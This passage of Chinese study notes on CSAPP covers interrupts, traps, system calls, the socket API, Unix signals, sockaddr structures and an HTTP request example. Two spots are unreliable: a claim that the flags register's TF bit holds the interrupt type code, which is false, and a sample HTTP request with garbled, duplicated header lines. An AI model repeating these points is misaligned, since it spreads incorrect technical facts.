<p>CPU除了进行运算以外，还要有对 <strong>I/O</strong> 能力（输入/输出），但是外设的输入输出 <strong>随时</strong> 可能发生，CPU必须要拥有可以 <strong>及时处理</strong> 这些信息的能力，这就引入了外中断的思想</p>
<p>这种中断发生完全是<strong>“异步”</strong>的，根本无法预测到此类中断会在什么时候发生</p>
<p><strong>外中断产生</strong></p>
<p>外设的输入将被存放在端口中，而其输入随时可能到达</p>
<p>信息到达时，外设的相关芯片会给CPU发出相应的<strong>中断信息</strong>，当CPU执行完当前的指令后，一旦检测到该<strong>中断信息</strong>，就会触发外中断，行为上和内中断相似</p>
<p>在PC系统中，外中断源一般有以下两类：</p>
<p>1.可屏蔽中断：</p>
<p>可屏蔽中断是CPU可以<strong>不响应</strong>的中断</p>
<p>其到底响不响应，主要是看<strong>IF</strong>寄存器（“<strong>IF</strong> = 1” ——&gt; 响应，“<strong>IF</strong> = 0” ——&gt; 不响应）</p>
<p>在CPU执行某个中断时，会把<strong>IF</strong>设置为“0”，可以暂时屏蔽其他中断</p>
<p>​        //指令sti：设置“IF=1”，指令cli：设置“IF=0”</p>
<p>2.不可屏蔽中断：</p>
<p>不可屏蔽中断是CPU必须执行的外中断，不可屏蔽中断<strong>不需要</strong>中断类型码，立即引发响应</p>
<p><strong>中断向量表</strong></p>
<p>中断向量表中保存了256个中断处理程序的入口</p>
<p>CPU接收到中断类型码后，就会根据中断类型表找到中断处理程序的入口</p>
<p><strong>中断过程</strong></p>
<p>1.CPU获取中断类型码</p>
<p>2.flag寄存器入栈（中断过程会改变flag寄存器）</p>
<p>3.设置flag寄存器的<strong>TF</strong>和<strong>IF</strong>为“0”</p>
<p>4.<strong>CS</strong>寄存器入栈</p>
<p>5.<strong>IP</strong>寄存器入栈</p>
<p>6.从中断向量表中读取中断处理程序的入口地址</p>
<p><strong>中断检查</strong></p>
<p>中断信息会被存储在flag寄存器的<strong>TF</strong>位中（TF = n：中断类型码为“n”）</p>
<p>CPU读取到此信息后就会开始<strong>中断过程</strong></p>
<h2 id="陷阱"><a href="#陷阱" class="headerlink" title="陷阱"></a>陷阱</h2><p>陷阱是有意的异常，是执行一条指令的结果</p>
<p>陷阱最重要的用途：在“用户程序”和“内核”之间提供一个一样的接口，称为<strong>系统调用</strong></p>
<p>处理器提供了一条特殊的指令：syscall，用于用户请求系统调用</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641808750527-1646286364493-1646808754597-1646808862603.png" class width="1641808750527"> 
<p>有些基于读写的操作必须要在 <strong>“内核模式”</strong> 中完成，而系统调用为了实现这些功能而诞生的，它通过提供 <strong>有权限限制</strong> 的  <strong>“内核模式”</strong> ，来实现一些 <strong>“用户模式”</strong> 无法办到的操作</p>
<p>用户程序通过系统调用从用户态（user mode）切换到核心态（ kernel mode ），从而可以访问相应的资源。这样做的好处是：</p>
<ul>
<li>为用户空间提供了一种硬件的抽象接口，使编程更加容易</li>
<li>有利于系统安全</li>
<li>有利于每个进程度运行在虚拟系统中，接口统一有利于移植</li>
</ul>
<p>当然，中断也可以实现系统调用（“int 80”）</p>
<h2 id="故障"><a href="#故障" class="headerlink" title="故障"></a>故障</h2><p>故障是由错误引起的，但是它<strong>可能</strong>可以被故障处理程序修正</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1641809596891-1646286364493-1646808754597-1646808862603.png" class width="1641809596891"> 
<p>当发生故障时，处理器会将控制转移给<strong>故障处理程序</strong>：如果可以修正故障，那么程序将返回并继续执行，否则，程序将返回内核中的“abort例程”并终止该程序</p>
<h2 id="终止"><a href="#终止" class="headerlink" title="终止"></a>终止</h2><p>终止是不可恢复的致命错误的结果，通常是一些硬件错误</p>
<p>终止处理程序将直接<strong>终止</strong>目标程序，不会返回任何信息</p>
<h2 id="内核模式"><a href="#内核模式" class="headerlink" title="内核模式"></a>内核模式</h2><p>处理器通常是用某个控制寄存器中的<strong>模式位</strong>来表示“当前进程的特权”</p>
<p>共两种特权：“用户模式”，“内核模式”</p>
<h2 id="套接字接口"><a href="#套接字接口" class="headerlink" title="套接字接口"></a>套接字接口</h2><p><strong>套接字接口</strong>（socket interface）是一组函数，它们和 Unix I/O 函数结合起来，用以创建网络应用</p>
<p>大多数现代系统上都实现套接字接口，包括所有的 Unix 变种、Windows 和 Macintosh 系统</p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646286717853-1646657383406-1646808754597-1646808862603.png" class width="1646286717853">  
<p>​        // 从 Linux 内核的角度来看，一个套接字就是 <strong>通信的一个端点</strong> ，从 Linux 程序的角度来看，套接字就是一个 <strong>有相应描述符的打开文件</strong></p>
<p>因特网的套接字地址存放在所示的类型为 sockaddr_in 的 16 字节结构中（IP 地址和端口号总是以网络字节顺序（大端法）存放的）</p>
<p>下面将介绍套接字接口中的部分函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span>;</span><br><span class="line"><span class="comment">// domain：即协议域，又称为协议族（family）</span></span><br><span class="line"><span class="comment">// type：指定socket类型</span></span><br><span class="line"><span class="comment">// protocol：指定协议</span></span><br></pre></td></tr></table></figure>
<p>​        // 协议族决定了 socket 的地址类型，在通信中必须采用对应的地址</p>
<p><strong>socket 函数</strong> 用于来返回一个 <strong>套接字描述符</strong> （clientfd）</p>
<ul>
<li>套接字描述符：用来标定系统为当前的进程划分的一块缓冲空间，类似于文件描述符 </li>
<li>文件描述符：是内核为了高效管理已被打开的文件所创建的索引，用于指代被打开的文件，对文件所有 I/O 操作相关的系统调用都需要通过文件描述符（open的返回值fd）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">// sockfd：需要绑定的socket</span></span><br><span class="line"><span class="comment">// *addr：存放了服务端用于通信的地址和端口</span></span><br><span class="line"><span class="comment">// addrlen: sizeof(sockaddr_in)</span></span><br></pre></td></tr></table></figure>
<p><strong>bind 函数</strong> 告诉内核将 addr 中的服务器套接字地址和套接字描述符 sockfd 联系起来</p>
<p>​        // bind函数把一个本地协议地址赋予一个套接字</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> clientfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line"><span class="comment">// clientfd：套接字描述符的一种</span></span><br><span class="line"><span class="comment">// addrlen：sizeof(sockaddr_in)</span></span><br></pre></td></tr></table></figure>
<p><strong>connect 函数</strong> 试图与 “套接字地址为 addr 的服务器” 建立一个因特网连接</p>
<p>如果成功，clientfd 描述符现在就准备好可以读写了(最好用 getaddrinfo 来为 connect 提供参数)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span>;</span><br><span class="line"><span class="comment">// sockfd：需要绑定的socket</span></span><br><span class="line"><span class="comment">// backlog：暗示了内核在开始拒绝连接请求之前，队列中要排队的未完成的连接请求的数量</span></span><br></pre></td></tr></table></figure>
<p><strong>listen 函数</strong> 将 sockfd 从一个 <strong>主动套接字</strong> 转化为一个 <strong>监听套接字</strong> （listening socket），该套接字可以接受来自客户端的连接请求</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> listenfd, struct sockaddr *addr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br><span class="line"><span class="comment">// listenfd：服务器的socket描述符</span></span><br><span class="line"><span class="comment">// *addr：指向struct sockaddr *的指针</span></span><br><span class="line"><span class="comment">// *addrlen：协议地址的长度</span></span><br></pre></td></tr></table></figure>
<p><strong>accept 函数</strong> 等待来自客户端的连接请求到达侦听描述符 listenfd，然后在 addr 中填写客户端的套接字地址，并返回一个 <strong>已连接描述符</strong> </p>
<p>一个服务器通常通常仅仅只创建一个监听socket描述字，内核为每个由服务器进程接受的客户连接创建了一个已连接socket描述字，当服务器完成了对某个客户的服务，相应的已连接socket描述字就被关闭</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getaddrinfo</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *host, <span class="keyword">const</span> <span class="keyword">char</span> *service,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">const</span> struct addrinfo *hints,</span></span></span><br><span class="line"><span class="params"><span class="function">                struct addrinfo **result)</span></span>;</span><br><span class="line"><span class="comment">// host &amp; service：套接字地址的两个组成部分</span></span><br><span class="line"><span class="comment">// 可选的参数 hints 是一个 addrinfo 结构，它提供对 getaddrinfo 返回的套接字地址列表的更好的控制</span></span><br><span class="line"><span class="comment">// getaddrinfo 返回 result，result 一个指向 addrinfo 结构的链表</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">freeaddrinfo</span><span class="params">(struct addrinfo *result)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span> *<span class="title">gai_strerror</span><span class="params">(<span class="keyword">int</span> errcode)</span></span>; <span class="comment">// 返回：错误消息</span></span><br></pre></td></tr></table></figure>
<p><strong>getaddrinfo 函数</strong> 将主机名、主机地址、服务名和端口号的字符串表示转化成套接字地址结构，它是已弃用的 gethostbyname 和 getservbyname 函数的新的替代品 </p>
<p>在客户端调用了 getaddrinfo 之后，会遍历这个列表，依次尝试每个套接字地址，直到调用 socket 和 connect 成功，建立起连接，类似地，服务器会尝试遍历列表中的每个套接字地址，直到调用 socket 和 bind 成功，描述符会被绑定到一个合法的套接字地址，</p>
<ul>
<li>为了避免内存泄漏，应用程序必须在最后调用 freeaddrinfo，释放该链表</li>
<li>如果 getaddrinfo 返回非零的错误代码，应用程序可以调用 gai_streeror，将该代码转换成消息字符串</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>             ai_flags;      <span class="comment">/* Hints argument flags */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_family;     <span class="comment">/* First arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_socktype;   <span class="comment">/* Second arg to socket function */</span></span><br><span class="line">    <span class="keyword">int</span>             ai_protocol;   <span class="comment">/* Third arg to socket function */</span></span><br><span class="line">    <span class="keyword">char</span>            *ai_canonname; <span class="comment">/* Canonical hostname */</span></span><br><span class="line">    <span class="keyword">size_t</span>          ai_addrlen;    <span class="comment">/* Size of ai_addr struct */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> *<span class="title">ai_addr</span>;</span>      <span class="comment">/* Ptr to socket address structure */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">addrinfo</span> *<span class="title">ai_next</span>;</span>      <span class="comment">/* Ptr to next item in linked list */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646312037232-1646808754597-1646808862603.png" class width="1646312037232"> 
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getnameinfo</span><span class="params">(<span class="keyword">const</span> struct sockaddr *sa, <span class="keyword">socklen_t</span> salen,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">char</span> *host, <span class="keyword">size_t</span> hostlen,</span></span></span><br><span class="line"><span class="params"><span class="function">                <span class="keyword">char</span> *service, <span class="keyword">size_t</span> servlen, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="comment">// *sa：指向大小为 salen 字节的套接字地址结构</span></span><br><span class="line"><span class="comment">// *host 指向大小为 hostlen 字节的缓冲区</span></span><br><span class="line"><span class="comment">// *service 指向大小为 servlen 字节的缓冲区</span></span><br><span class="line"><span class="comment">// 参数 flags 是一个位掩码，能够修改默认的行为</span></span><br></pre></td></tr></table></figure>
<p><strong>getnameinfo 函数</strong> 和 getaddrinfo 是相反的，将一个套接字地址结构转换成相应的主机和服务名字符串，它是已弃用的 gethostbyaddr 和 getservbyport 函数的新的替代品 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_clientfd</span><span class="params">(<span class="keyword">char</span> *hostname, <span class="keyword">char</span> *port)</span></span>;</span><br><span class="line"><span class="comment">// *hostname：服务器运行的地址</span></span><br><span class="line"><span class="comment">// *port：指向端口</span></span><br></pre></td></tr></table></figure>
<p>客户端调用 open_clientfd 建立与服务器的连接 </p>
<p><strong>open_clientfd 函数</strong> 建立与服务器的连接，该服务器运行在主机 hostname 上，并在端口号 port 上监听连接请求 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_listenfd</span><span class="params">(<span class="keyword">char</span> *port)</span></span>;</span><br><span class="line"><span class="comment">// *port：指向端口号</span></span><br></pre></td></tr></table></figure>
<p><strong>open_listenfd 函数</strong> 打开和返回一个监听描述符，这个描述符准备好在端口 port_h 接收连接请求 </p>
<h2 id="网络编程中的信号"><a href="#网络编程中的信号" class="headerlink" title="网络编程中的信号"></a>网络编程中的信号</h2><p><strong>进程组</strong></p>
<p>进程组就是一系列相互关联的进程集合，系统中的每一个进程也必须从属于某一个进程组，每个进程组中都会有一个唯一的 ID(process group id)，简称 PGID，PGID 一般等同于进程组的创建进程的 Process ID，而这个进进程一般也会被称为进程组先导(process group leader)，同一进程组中除了进程组先导外的其他进程都是其子进程</p>
<p>进程组的存在，方便了系统对多个相关进程执行某些统一的操作，例如：我们可以一次性发送一个信号量给同一进程组中的所有进程</p>
<p><strong>会话</strong></p>
<p>会话（session）是一个若干进程组的集合，同样的，系统中每一个进程组也都必须从属于某一个会话</p>
<ul>
<li>一个会话只拥有最多一个控制终端（也可以没有），该终端为会话中所有进程组中的进程所共用</li>
<li>一个会话中前台进程组只会有一个，只有其中的进程才可以和控制终端进行交互，除了前台进程组外的进程组，都是后台进程组</li>
</ul>
<p>和进程组先导类似，会话中也有会话先导(session leader)的概念，用来表示建立起到控制终端连接的进程，在拥有控制终端的会话中，session leader 也被称为控制进程(controlling process)，一般来说控制进程也就是登入系统的 shell 进程(login shell)</p>
<p><strong>带外数据</strong></p>
<p>带外数据用于迅速告知对方本端发生的重要的事件，它比普通的数据（带内数据）拥有更高的优先级， <strong>不论发送缓冲区中是否有排队等待发送的数据，它总是被立即发送</strong> ，带外数据的传输可以使用一条独立的传输层连接，也可以映射到传输普通数据的连接中，</p>
<p>​        // 实际应用中，带外数据是使用很少见，有 telnet 和 ftp 等远程非活跃程序</p>
<p>UDP没有没有实现带外数据传输，TCP也没有真正的带外数据，不过TCP利用头部的紧急指针标志和紧急指针，为应用程序提供了一种紧急方式，含义和带外数据类似，TCP的紧急方式利用传输普通数据的连接来传输紧急数据</p>
<p><strong>SIGHUP信号</strong>（关闭进程）</p>
<p>SIGHUP 信号在 <strong>用户终端连接(正常或非正常)结束</strong> 时发出, 通常是在终端的控制进程结束时, 通知同一session内的各个作业(任务)，这时它们与控制终端不再关联</p>
<p>系统对SIGHUP信号的默认处理是：<strong>终止收到该信号的进程</strong> ，所以若程序中没有捕捉该信号，当收到该信号时，进程就会退出</p>
<p>SIGHUP会在以下3种情况下被发送给相应的进程：</p>
<ul>
<li>终端关闭时，该信号被发送到 session 首进程以及作为 job 提交的进程（即用 &amp; 符号提交的进程）</li>
<li>session 首进程退出时，该信号被发送到该 session 中的前台进程组中的每一个进程</li>
<li>若父进程退出导致进程组成为孤儿进程组，且该进程组中有进程处于停止状态（收到SIGSTOP或SIGTSTP信号），该信号会被发送到该进程组中的每一个进程</li>
</ul>
<p>例如：在我们登录Linux时，系统会分配给登录用户一个终端(Session)，在这个终端运行的所有程序，包括前台进程组和后台进程组，一般都属于这个 Session，当用户退出Linux登录时，前台进程组和后台有对终端输出的进程将会收到SIGHUP信号，这个信号的默认操作为终止进程，因此前台进程组和后台有终端输出的进程就会中止</p>
<p>​        // 晦涩难懂，需要在实例中理解分析</p>
<p><strong>SIGPIPE信号</strong>（告知中断）</p>
<p>当 <strong>往一个写端关闭的管道或 socket 连接中连续写入数据时会引发 SIGPIPE 信号</strong>（引发 SIGPIPE 信号的写操作将设置 errno 为EPIPE）</p>
<p>在TCP通信中，当通信的双方中的一方close一个连接时，若另一方接着发数据，根据TCP协议的规定，会收到一个RST(Reset the connection)响应报文，若再往这个服务器发送数据时，系统会发出一个SIGPIPE信号给进程，<strong>告诉进程这个连接已经断开了，不能再写入数据</strong></p>
<ul>
<li>即使断开还可以进行一次通信，第二次发送数据时才触发SIGPIPE</li>
<li>可以用相应的 handle 进行处理SIGPIPE，完成想要的操作</li>
</ul>
<h2 id="网络编程结构体"><a href="#网络编程结构体" class="headerlink" title="网络编程结构体"></a>网络编程结构体</h2><p><strong>通用结构体：struct sockaddr，16个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generic socket address structure (for connect, bind, and accept) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>   sa_family;      <span class="comment">/* Protocol family */</span></span><br><span class="line">    <span class="keyword">char</span>       sa_data[<span class="number">14</span>];    <span class="comment">/* Address data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>struct sockaddr 是一个通用地址结构，这是为了统一地址结构的表示方法，统一接口函数，使不同的地址结构可以被bind() , connect() 等函数调用</p>
<p>sockaddr的缺陷：sa_data 把目标地址和端口信息混在一起了 </p>
<p><strong>通用结构体：struct sockaddr_storage，128个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Structure large enough to hold any socket address </span></span><br><span class="line"><span class="comment">  (with the historical exception of AF_UNIX). 128 bytes reserved.  */</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> ULONG_MAX &gt; 0xffffffff</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __ss_aligntype __uint64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> __ss_aligntype __uint32_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SS_SIZE        128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _SS_PADSIZE     (_SS_SIZE - (2 * sizeof (__ss_aligntype)))</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     <span class="keyword">uint16_t</span>          ss_family;     <span class="comment">/* Address family */</span></span><br><span class="line">     __ss_aligntype   __ss_align;     <span class="comment">/* Force desired alignment.  */</span></span><br><span class="line">     <span class="keyword">char</span> __ss_padding[_SS_PADSIZE];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>struct sockaddr_storage 被设计为同时适合 struct sockaddr_in 和 struct sockaddr_in6 </p>
<p>为了避免试图知道要使用的IP版本，可以使用 struct sockaddr_storage，该版本可以保存其中任何一个，后将通过 connect()，bind() 等函数将其类型转换为 struct sockaddr 并以这种方式进行访问 </p>
<p><strong>IPv4：struct sockaddr_in，16个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* IP socket address structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>       sin_family;   <span class="comment">/* Protocol family (always AF_INET) */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>       sin_port;     <span class="comment">/* 16位的端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>     <span class="comment">/* 32位的IP地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="keyword">sizeof</span> (struct sockaddr) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (<span class="keyword">sa_family_t</span>) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (<span class="keyword">in_port_t</span>) -</span><br><span class="line">                           <span class="keyword">sizeof</span> (struct in_addr)]; <span class="comment">// sin_zero[8]</span></span><br><span class="line">    <span class="comment">/* Pad to sizeof(struct sockaddr) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> <span class="keyword">in_addr_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>  &#123;</span></span><br><span class="line">     <span class="keyword">in_addr_t</span>   s_addr;            <span class="comment">/* IPv4 address */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>该结构体解决了 sockaddr 的缺陷，把 port 和 addr 分开储存在两个变量中 </p>
<p><strong>IPv6：struct sockaddr_in6，28个字节</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin6_family;      <span class="comment">/* AF_INET6 */</span></span><br><span class="line">    <span class="keyword">uint16_t</span>    sin6_port;        <span class="comment">/* Transport layer port # */</span></span><br><span class="line">    <span class="keyword">uint32_t</span>    sin6_flowinfo;    <span class="comment">/* IPv6 flow information */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>    <span class="comment">/* IPv6 address */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> sin6_scope_id;       <span class="comment">/* IPv6 scope-id */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">uint8_t</span> u6_addr8[<span class="number">16</span>];</span><br><span class="line">        <span class="keyword">uint16_t</span> u6_addr16[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">uint32_t</span> u6_addr32[<span class="number">4</span>];</span><br><span class="line">    &#125; in6_u;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr                 in6_u.u6_addr8</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr16               in6_u.u6_addr16</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">define</span> s6_addr32               in6_u.u6_addr32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="服务器简析"><a href="#服务器简析" class="headerlink" title="服务器简析"></a>服务器简析</h2><p>每个网络应用都是基于客户端—服务器模型的，釆用这个模型，一个应用是由 <strong>一个服务器进程</strong> 和一个或者多个 <strong>客户端</strong> 进程组成 </p>
<img src="/2022/01/01/%E4%BB%8ECSapp%E4%B8%AD%E6%94%B6%E8%8E%B7%E7%9A%84%E7%9F%A5%E8%AF%86/1646286501329-1646657383406-1646808754597-1646808862603.png" class width="1646286501329"> 
<p>个客户端—服务器事务由以下四步组成：</p>
<ol>
<li>当一个客户端需要服务时，它向服务器发送一个请求，发起一个事务，例如，当 Web 浏览器需要一个文件时，它就发送一个请求给 Web 服务器</li>
<li>服务器收到请求后，解释它，并以适当的方式操作它的资源，例如，当 Web 服务器收到浏览器发出的请求后，它就读一个磁盘文</li>
<li>服务器给客户端发送一个响应，并等待下一个请求，例如，Web 服务器将文件发送回客户端</li>
<li>客户端收到响应并处理它，例如，当 Web 浏览器收到来自服务器的一页后，就在屏幕上显示此页</li>
</ol>
<h2 id="服务器请求"><a href="#服务器请求" class="headerlink" title="服务器请求"></a>服务器请求</h2><p>一般的请求消息如下代码所示：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">GET /home.html HTTP/1.0 <span class="comment">&lt;!-- 请求消息行 --&gt;</span></span><br><span class="line">Accept: */* <span class="comment">&lt;!-- 请求消息头 --&gt;</span></span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:GET /home.html HTTP/1.0</span><br><span class="line">Accept: */*</span><br><span class="line">Host: localhost:</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</span><br><span class="line">Connection: close</span><br><span class="line">Proxy-Connection: close</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="comment">&lt;!-- 消息正文 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">align</span>=<span class="string">&quot;middle&quot;</span> <span class="attr">src</span>=<span class="string">&quot;godzilla.gif&quot;</span>&gt;</span></span><br><span class="line">Dave O&#x27;Hallaron</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>请求消息行：请求消息的第一行为请求消息行</p>
<ul>
